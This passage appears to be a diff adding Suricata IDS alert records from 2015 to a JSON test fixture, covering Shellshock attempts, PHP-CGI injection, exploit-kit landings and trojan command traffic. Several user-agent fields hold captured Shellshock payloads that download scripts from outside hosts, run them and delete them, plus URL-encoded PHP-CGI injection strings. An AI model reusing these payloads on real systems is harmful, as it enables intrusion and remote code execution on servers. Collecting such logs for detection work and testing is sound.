+      "bytes_toserver": 644,
+      "bytes_toclient": 764,
+      "start": "2015-04-08T20:16:46.064276-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2019308,
+      "rev": 2,
+      "signature": "ET WEB_SERVER CURL Command Specifying Output in HTTP Headers",
+      "category": "Attempted Administrator Privilege Gain",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-04-08T20:16:48.304137-0600",
+    "flow_id": 1941651116194580,
+    "pcap_cnt": 33858,
+    "event_type": "alert",
+    "src_ip": "66.135.38.206",
+    "src_port": 43497,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "95.192.215.175",
+      "url": "HTTP/1.1",
+      "http_user_agent": "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "length": 0
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 5,
+      "bytes_toserver": 644,
+      "bytes_toclient": 764,
+      "start": "2015-04-08T20:16:46.064276-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2019309,
+      "rev": 2,
+      "signature": "ET WEB_SERVER WGET Command Specifying Output in HTTP Headers",
+      "category": "Attempted Administrator Privilege Gain",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-04-09T04:09:02.683325-0600",
+    "flow_id": 636219138313085,
+    "pcap_cnt": 119922,
+    "event_type": "alert",
+    "src_ip": "60.250.33.201",
+    "src_port": 39659,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "95.192.215.175",
+      "url": "HTTP/1.1",
+      "http_user_agent": "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"cd /tmp;cd /var/tmp;rm -rf .c.txt;rm -rf .d.txt ; wget http://109.228.25.87/.c.txt ; curl -O http://109.228.25.87/.c.txt ; fetch http://109.228.25.87/.c.txt ; lwp-download http://109.228.25.87/.c.txt; chmod +x .c.txt* ; sh .c.txt* \");'",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 400,
+      "length": 226
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 741,
+      "bytes_toclient": 690,
+      "start": "2015-04-09T04:09:01.723837-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2019310,
+      "rev": 2,
+      "signature": "ET WEB_SERVER WGET Command Specifying Output in HTTP Headers",
+      "category": "Attempted Administrator Privilege Gain",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-03-09T02:30:58.027602-0600",
+    "flow_id": 1729073743136970,
+    "pcap_cnt": 29750,
+    "event_type": "alert",
+    "src_ip": "191.232.80.55",
+    "src_port": 443,
+    "dest_ip": "192.168.0.53",
+    "dest_port": 1156,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2019416,
+      "rev": 3,
+      "signature": "ET POLICY SSLv3 outbound connection from client vulnerable to POODLE attack",
+      "category": "Potential Corporate Privacy Violation",
+      "severity": 1
+    },
+    "tls": {
+      "version": "SSLv3"
+    },
+    "app_proto": "tls",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 314,
+      "bytes_toclient": 3563,
+      "start": "2015-03-09T02:30:56.985290-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:16:50.146634-0600",
+    "flow_id": 1731429678536248,
+    "pcap_cnt": 145809,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 60060,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2019526,
+      "rev": 4,
+      "signature": "ET WEB_SERVER WEB-PHP phpinfo access",
+      "category": "Information Leak",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/phpinfo.php",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 209
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 587,
+      "bytes_toclient": 642,
+      "start": "2015-03-17T02:16:49.874040-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:25:49.469240-0600",
+    "flow_id": 1024396492660414,
+    "pcap_cnt": 182335,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 52703,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/index.php?-dallow_url_include%3don+-dauto_prepend_file%3dphp://input",
+      "http_content_type": "text/html",
+      "http_method": "POST",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 207
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 493,
+      "bytes_toclient": 584,
+      "start": "2015-03-17T02:25:49.188094-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2019804,
+      "rev": 3,
+      "signature": "ET WEB_SERVER PHP.//Input in HTTP POST",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:23:48.373044-0600",
+    "flow_id": 530230432539618,
+    "pcap_cnt": 165962,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 47661,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/%70%68%70%70%61%74%68/%70%68%70?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
+      "http_content_type": "text/html",
+      "http_method": "POST",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 209
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 1208,
+      "bytes_toclient": 642,
+      "start": "2015-03-17T02:23:48.107490-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2020102,
+      "rev": 4,
+      "signature": "ET WEB_SERVER PHP System Command in HTTP POST",
+      "category": "Web Application Attack",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-03-27T02:49:35.170605-0600",
+    "flow_id": 1495166592457325,
+    "pcap_cnt": 50252,
+    "event_type": "alert",
+    "src_ip": "192.168.0.54",
+    "src_port": 63642,
+    "dest_ip": "192.168.0.1",
+    "dest_port": 53,
+    "proto": "UDP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2020565,
+      "rev": 2,
+      "signature": "ET POLICY Dropbox DNS Lookup - Possible Offsite File Backup in Use",
+      "category": "Potential Corporate Privacy Violation",
+      "severity": 1
+    },
+    "app_proto": "dns",
+    "flow": {
+      "pkts_toserver": 1,
+      "pkts_toclient": 0,
+      "bytes_toserver": 81,
+      "bytes_toclient": 0,
+      "start": "2015-03-27T02:49:35.170605-0600"
+    }
+  },
+  {
+    "timestamp": "2015-04-07T07:34:44.564366-0600",
+    "flow_id": 1197526488434924,
+    "pcap_cnt": 152051,
+    "event_type": "alert",
+    "src_ip": "192.168.0.53",
+    "src_port": 2210,
+    "dest_ip": "68.164.182.11",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2020644,
+      "rev": 2,
+      "signature": "ET CURRENT_EVENTS Unknown Malicious Second Stage Download URI Struct M2 Feb 06 2015",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "www.mybusinessdoc.com",
+      "url": "/document.php?rnd=3271&id=5555525E01160D0F4A0C0E010809120D0F240309050D084A070B09",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0)",
+      "http_content_type": "image/gif",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 2565
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 5,
+      "bytes_toserver": 508,
+      "bytes_toclient": 5880,
+      "start": "2015-04-07T07:34:43.772332-0600"
+    }
+  },
+  {
+    "timestamp": "2015-04-07T07:47:48.239690-0600",
+    "flow_id": 97289058286897,
+    "pcap_cnt": 161271,
+    "event_type": "alert",
+    "src_ip": "92.222.174.249",
+    "src_port": 80,
+    "dest_ip": "192.168.0.53",
+    "dest_port": 2901,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2020841,
+      "rev": 2,
+      "signature": "ET CURRENT_EVENTS Nuclear EK Landing Apr 03 2015",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "mashinescoolsa.com",
+      "url": "/QhJFUFtXSVhIDwNFXQhaBxFVWg5YEQMYVg5Z.html",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)",
+      "http_content_type": "text/html",
+      "http_refer": "http://fitgame.eu/mfg.php",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 24296
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 13,
+      "pkts_toclient": 21,
+      "bytes_toserver": 1144,
+      "bytes_toclient": 25691,
+      "start": "2015-04-07T07:46:42.884017-0600"
+    }
+  },
+  {
+    "timestamp": "2015-04-07T07:47:48.239690-0600",
+    "flow_id": 97289058286897,
+    "pcap_cnt": 161271,
+    "event_type": "alert",
+    "src_ip": "92.222.174.249",
+    "src_port": 80,
+    "dest_ip": "192.168.0.53",
+    "dest_port": 2901,
+    "proto": "TCP",
+    "http": {
+      "hostname": "mashinescoolsa.com",
+      "url": "/QhJFUFtXSVhIDwNFXQhaBxFVWg5YEQMYVg5Z.html",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)",
+      "http_content_type": "text/html",
+      "http_refer": "http://fitgame.eu/mfg.php",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 24296
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 13,
+      "pkts_toclient": 21,
+      "bytes_toserver": 1144,
+      "bytes_toclient": 25691,
+      "start": "2015-04-07T07:46:42.884017-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2020865,
+      "rev": 3,
+      "signature": "ET CURRENT_EVENTS Nuclear EK Landing Apr 08 2015",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-04-07T07:47:48.239690-0600",
+    "flow_id": 97289058286897,
+    "pcap_cnt": 161271,
+    "event_type": "alert",
+    "src_ip": "92.222.174.249",
+    "src_port": 80,
+    "dest_ip": "192.168.0.53",
+    "dest_port": 2901,
+    "proto": "TCP",
+    "http": {
+      "hostname": "mashinescoolsa.com",
+      "url": "/QhJFUFtXSVhIDwNFXQhaBxFVWg5YEQMYVg5Z.html",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)",
+      "http_content_type": "text/html",
+      "http_refer": "http://fitgame.eu/mfg.php",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 24296
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 13,
+      "pkts_toclient": 21,
+      "bytes_toserver": 1144,
+      "bytes_toclient": 25691,
+      "start": "2015-04-07T07:46:42.884017-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2020975,
+      "rev": 4,
+      "signature": "ET CURRENT_EVENTS Nuclear EK Landing Apr 22 2015",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-04-08T17:57:24.710773-0600",
+    "flow_id": 1931776438360087,
+    "pcap_cnt": 21135,
+    "event_type": "alert",
+    "src_ip": "192.168.0.53",
+    "src_port": 4298,
+    "dest_ip": "88.214.241.199",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2021251,
+      "rev": 3,
+      "signature": "ET TROJAN Poweliks Clickfraud CnC M4",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "88.214.241.199",
+      "url": "/click?sid=ebda40fdc8b8dcb385d77b0ef49b03705f101744&cid=0",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)",
+      "http_refer": "http://searchl.org/search?q=what&subid=5595",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 301,
+      "redirect": "http://162.221.224.64/clicks.php?c=w5WAwcj%2BSvSssS62DEb4qTIS0%2FEo%2FTqvaAb8UFrHyFz3fzs1HHNIy4hbVBz%2FYhdtO5szeKcidCZKCWPzpcm8NCzo1A7sdeCG5ytmT3EA1XuxYLff0NizDjkmg%2Brf%2FBucXkn3jPJ4wQ2%2BsysZZfqUskT5%2FnJfXuN6SI1IEQno6CQ2DjzaA08f60IS9Hxi%2FIKCQta3JEb3mNuyqPvsFUCKFzvzKwX6O5r%2FnKuetU3k2fyFaABwK1aCF0BrCq1OHuXEFQCryk%2FYgBXFPcYIlcPGa7jNSsV5TdDoPlzpTCaoSfAb57%2BMovBkPiDcRMIYGvRPjltsSSj8CjsmqLgNfCw7QMip5kOjkxs%2F43LqfkMGUu6pPE53%2BKnchlT8dQoOcG7lBXUiRFZWmG%2Ftk66n83X0OfMLOBBMFNuQc0LNzDHk9b2KuHM1gd1lwJZA%2FmWIrzaByNYHjafkJNpz7RXjcyezPqaC2aRMFRigPK6y6PXJadY9yNgt4ocRoth3SB7VoQCzA8S%2FrjjlPYLoioZVR6z08kTLmDU8d6h5pqMKgI9C7OR1O179z06ruS55ZDy5P5ABwreO41OcnjP%2BUpNl2MXZcx2vvw4hQtUKjjsZz67%2F1Tk9WZyOitkbGQx3XzDRnkpLBpdns4dHQouJgjnKRQdlKj0ckOuE9hXregtBNFhQd9oM9DKfCSuz1ABvEADe9jP5Nf5txp6gpAiCQuT4gjVFRdMMbWWxmUAjb5FYLgru7A4Mlx61HRXErqy0zGW79zZgzF5bo4KAnlOFkM2ouLR9eYJbUwYgao4haS9YnragfYTF9rJ7HG%2Fv%2B%2BJfXRbGJBSRN8%2Bm7FQDUhLEVGzb9JzufF6TNhp1xmohnpvSEkbMN6PTdiWq6kzhJ3YqGAmMvA8SP2xeazovO7EKRxVAbEBEjVFVjWeEBLWDZ51f5jzHYKFcQu%2BdozYdm3BuyPBPGk1d",
+      "length": 0
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 633,
+      "bytes_toclient": 1490,
+      "start": "2015-04-08T17:57:24.382999-0600"
+    }
+  },
+  {
+    "timestamp": "2015-04-07T07:34:44.564366-0600",
+    "flow_id": 1197526488434924,
+    "pcap_cnt": 152051,
+    "event_type": "alert",
+    "src_ip": "192.168.0.53",
+    "src_port": 2210,
+    "dest_ip": "68.164.182.11",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "www.mybusinessdoc.com",
+      "url": "/document.php?rnd=3271&id=5555525E01160D0F4A0C0E010809120D0F240309050D084A070B09",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0)",
+      "http_content_type": "image/gif",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 2565
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 5,
+      "bytes_toserver": 508,
+      "bytes_toclient": 5880,
+      "start": "2015-04-07T07:34:43.772332-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2021786,
+      "rev": 2,
+      "signature": "ET CURRENT_EVENTS Unknown Malicious Second Stage Download URI Struct Sept 15 2015",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:25:56.644842-0600",
+    "flow_id": 68362542810164,
+    "pcap_cnt": 183773,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 52920,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/cgi-bin/index.php5",
+      "http_user_agent": "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 216
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 658,
+      "bytes_toclient": 649,
+      "start": "2015-03-17T02:25:56.361524-0600"
+    },
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2022028,
+      "rev": 1,
+      "signature": "ET WEB_SERVER Possible CVE-2014-6271 Attempt",
+      "category": "Attempted Administrator Privilege Gain",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-03-17T03:01:20.331207-0600",
+    "flow_id": 1402658696991703,
+    "pcap_cnt": 228141,
+    "event_type": "alert",
+    "src_ip": "192.168.0.54",
+    "src_port": 49492,
+    "dest_ip": "213.155.156.188",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2024379,
+      "rev": 22,
+      "signature": "ET POLICY Outdated Flash Version M2",
+      "category": "Potential Corporate Privacy Violation",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "de17a.com",
+      "url": "/a/66207/94821.swf?rf=http%3A%2F%2Fd5p.de17a.com%2Fvictory%2Fopenx%3Fauction_id%3Dcba1de32-82c3-436f-84ab-9050130696b7%26bp%3DAAABTCb3Pyamm_73LlI6xY49eIHCSsUHza570w%26creative_id%3D33683%26dfh%3D03%26dd%3DAQMVAQgWAGh0dHA6Ly9ncm9vdmVzaGFyay5jb20CowUIJAAzZjgzYWY0OC0yMTE2LTE4MDctNDI2MS0xYjg1MmM4NDFiYzYGBJODBwVg2w8I0wkGIwPsWgoDCwsIJABjYmExZGUzMi04MmMzLTQzNmYtODRhYi05MDUwMTMwNjk2YjcMBCwBDQP6DgkPCRAEA5IRBylTyTSokYpNEgZf7QdVEwYG66d6FQXRzQEWBAD-F4MZgzI_CgA&dsp_client_id=2213&dsp_campaign_id=7160&dsp_bidding_plan_id=37379&dsp_auctioneer_id=6&dsp_auction_id=cba1de32-82c3-436f-84ab-9050130696b7&dsp_hash=1c901d825720840460e71c4cdb8dd53af558f992&z=0.3192254970781505",
+      "http_user_agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36",
+      "http_content_type": "application/x-shockwave-flash",
+      "http_refer": "http://de17a.com/a/66207.iframe?dsp_client_id=2213&dsp_campaign_id=7160&dsp_bidding_plan_id=37379&dsp_auctioneer_id=6&dsp_auction_id=cba1de32-82c3-436f-84ab-9050130696b7&dsp_hash=1c901d825720840460e71c4cdb8dd53af558f992&url=http://d5p.de17a.com/click/openx?auction_id=cba1de32-82c3-436f-84ab-9050130696b7&dd=AQMWAQgWAGh0dHA6Ly9ncm9vdmVzaGFyay5jb20CowUIJAAzZjgzYWY0OC0yMTE2LTE4MDctNDI2MS0xYjg1MmM4NDFiYzYGBJODBwVg2w8I0wkGIwPsWgoDCwsIJABjYmExZGUzMi04MmMzLTQzNmYtODRhYi05MDUwMTMwNjk2YjcMBCwBDQP6DgkPCRAEA5IRBylTyTSokYpNEgZf7QdVEwYG66d6FAkVBdHNARYEAP4XgxmDQA_CgA&url=http%3A%2F%2Fde17a.com%2Fa%2F66207.click",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 1790
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 5,
+      "pkts_toclient": 4,
+      "bytes_toserver": 1994,
+      "bytes_toclient": 3038,
+      "start": "2015-03-17T03:01:20.267223-0600"
+    }
+  },
+  {
+    "timestamp": "2015-04-11T14:25:11.424711-0600",
+    "flow_id": 1715472267966383,
+    "pcap_cnt": 173758,
+    "event_type": "alert",
+    "src_ip": "45.63.7.209",
+    "src_port": 53806,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "-c",
+      "url": "//%63%67%69%2D%62%69%6E/%70%68%70?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E",
+      "http_content_type": "text/html",
+      "http_method": "POST",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 209
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 1126,
+      "bytes_toclient": 586,
+      "start": "2015-04-11T14:25:11.096175-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2024930,
+      "rev": 1,
+      "signature": "ET WEB_SERVER 401TRG Generic Webshell Request - POST with wget in body",
+      "category": "Web Application Attack",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-04-13T02:42:43.754579-0600",
+    "flow_id": 358992719348983,
+    "pcap_cnt": 70568,
+    "event_type": "alert",
+    "src_ip": "192.168.0.53",
+    "src_port": 3522,
+    "dest_ip": "71.95.164.42",
+    "dest_port": 8080,
+    "proto": "TCP",
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2025019,
+      "rev": 1,
+      "signature": "ET TROJAN Possible NanoCore C2 60B",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    },
+    "flow": {
+      "pkts_toserver": 3,
+      "pkts_toclient": 1,
+      "bytes_toserver": 236,
+      "bytes_toclient": 64,
+      "start": "2015-04-13T02:42:43.427255-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-19T04:50:09.415390-0600",
+    "flow_id": 191317871559650,
+    "pcap_cnt": 54740,
+    "event_type": "alert",
+    "src_ip": "103.10.197.187",
+    "src_port": 2702,
+    "dest_ip": "192.168.0.54",
+    "dest_port": 49368,
+    "proto": "TCP",
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2025644,
+      "rev": 1,
+      "signature": "ET TROJAN Possible Metasploit Payload Common Construct Bind_API (from server)",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    },
+    "app_proto": "failed",
+    "flow": {
+      "pkts_toserver": 356,
+      "pkts_toclient": 544,
+      "bytes_toserver": 22880,
+      "bytes_toclient": 760118,
+      "start": "2015-03-19T04:49:42.590818-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-18T03:57:03.005367-0600",
+    "flow_id": 564271929424192,
+    "pcap_cnt": 25651,
+    "event_type": "alert",
+    "src_ip": "192.168.0.54",
+    "src_port": 49904,
+    "dest_ip": "54.146.156.135",
+    "dest_port": 5222,
+    "proto": "TCP",
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2100230,
+      "rev": 3,
+      "signature": "GPL CHAT Jabber/Google Talk Outgoing Traffic",
+      "category": "Not Suspicious Traffic",
+      "severity": 3
+    },
+    "app_proto": "failed",
+    "flow": {
+      "pkts_toserver": 24,
+      "pkts_toclient": 34,
+      "bytes_toserver": 3956,
+      "bytes_toclient": 37567,
+      "start": "2015-03-18T03:56:56.784704-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:07:45.512575-0600",
+    "flow_id": 63036711854918,
+    "pcap_cnt": 129192,
+    "event_type": "alert",
+    "src_ip": "82.165.177.154",
+    "src_port": 80,
+    "dest_ip": "192.168.0.51",
+    "dest_port": 42244,
+    "proto": "TCP",
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2100498,
+      "rev": 7,
+      "signature": "GPL ATTACK_RESPONSE id check returned root",
+      "category": "Potentially Bad Traffic",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "www.testmyids.com",
+      "url": "/",
+      "http_user_agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 39
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 5,
+      "pkts_toclient": 4,
+      "bytes_toserver": 903,
+      "bytes_toclient": 1951,
+      "start": "2015-03-17T02:07:45.287558-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:22:26.369465-0600",
+    "flow_id": 1611003112621508,
+    "pcap_cnt": 158872,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 45791,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/iisadmpwd/aexp.htr",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 216
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 594,
+      "bytes_toclient": 649,
+      "start": "2015-03-17T02:22:26.099780-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2100987,
+      "rev": 16,
+      "signature": "GPL EXPLOIT .htr access",
+      "category": "access to a potentially vulnerable web application",
+      "severity": 2
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:16:33.652764-0600",
+    "flow_id": 1754502241454541,
+    "pcap_cnt": 144873,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 59138,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 31,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2100993,
+      "rev": 13,
+      "signature": "GPL WEB_SERVER iisadmin access",
+      "category": "Web Application Attack",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/iisadmin/",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 207
+    },
+    "app_proto": "http",
+    "flow": {
